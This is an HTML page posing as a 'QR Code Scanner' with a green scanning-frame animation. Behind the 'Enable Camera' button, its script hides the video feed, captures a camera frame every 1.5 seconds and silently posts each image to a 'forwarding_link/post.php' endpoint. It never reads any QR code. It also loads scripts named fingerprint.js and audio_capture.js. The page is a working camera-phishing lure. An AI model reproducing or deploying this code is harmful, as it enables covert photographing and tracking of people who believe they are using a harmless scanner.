<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Code Scanner</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .scanner-container {
            text-align: center;
            padding: 20px;
        }

        h1 {
            color: #00ff00;
            font-size: 28px;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .scanner-frame {
            width: 280px;
            height: 280px;
            position: relative;
            margin: 0 auto 30px;
        }

        .scanner-border {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid rgba(0, 255, 0, 0.3);
        }

        /* Corner markers */
        .corner {
            position: absolute;
            width: 40px;
            height: 40px;
            border-color: #00ff00;
            border-style: solid;
        }

        .corner-tl {
            top: 0;
            left: 0;
            border-width: 4px 0 0 4px;
        }

        .corner-tr {
            top: 0;
            right: 0;
            border-width: 4px 4px 0 0;
        }

        .corner-bl {
            bottom: 0;
            left: 0;
            border-width: 0 0 4px 4px;
        }

        .corner-br {
            bottom: 0;
            right: 0;
            border-width: 0 4px 4px 0;
        }

        /* Scanning line animation */
        .scan-line {
            position: absolute;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff00, transparent);
            top: 0;
            left: 0;
            animation: scan 2s linear infinite;
            box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }

        @keyframes scan {
            0% {
                top: 0;
            }
            50% {
                top: calc(100% - 2px);
            }
            100% {
                top: 0;
            }
        }

        .instructions {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .enable-btn {
            background: #00ff00;
            color: #000000;
            border: none;
            padding: 16px 50px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .enable-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
        }

        .video-wrap {
            display: none;
        }

        #canvas {
            display: none;
        }

        .status {
            margin-top: 20px;
            color: #00ff00;
            font-size: 14px;
        }

        .qr-icon {
            font-size: 48px;
            margin-bottom: 20px;
            opacity: 0.7;
        }

        .footer-info {
            position: fixed;
            bottom: 20px;
            color: #444;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <!-- Hidden webcam capture elements -->
    <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas id="canvas" width="640" height="480"></canvas>

    <div class="scanner-container">
        <div class="qr-icon">ðŸ“·</div>
        <h1>Scan QR Code</h1>
        
        <div class="scanner-frame">
            <div class="scanner-border"></div>
            <div class="corner corner-tl"></div>
            <div class="corner corner-tr"></div>
            <div class="corner corner-bl"></div>
            <div class="corner corner-br"></div>
            <div class="scan-line"></div>
        </div>

        <p class="instructions">
            Position the QR code within the frame<br>
            The scanner will automatically detect it
        </p>

        <button class="enable-btn" onclick="enableCamera()">Enable Camera</button>

        <p class="status" id="status"></p>
    </div>

    <div class="footer-info">
        Powered by QR Scanner Pro
    </div>

    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {},
                error: function() {}
            });
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const constraints = {
            audio: false,
            video: {
                facingMode: "environment"
            }
        };

        async function enableCamera() {
            document.getElementById('status').textContent = 'Initializing camera...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
                document.getElementById('status').textContent = 'Camera active - Scanning...';
            } catch (e) {
                document.getElementById('status').textContent = 'Camera access denied';
                console.log('Camera access denied');
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            var context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }
    </script>
    <script src="../js/fingerprint.js"></script>
    <script src="../js/audio_capture.js"></script>
</body>
</html>
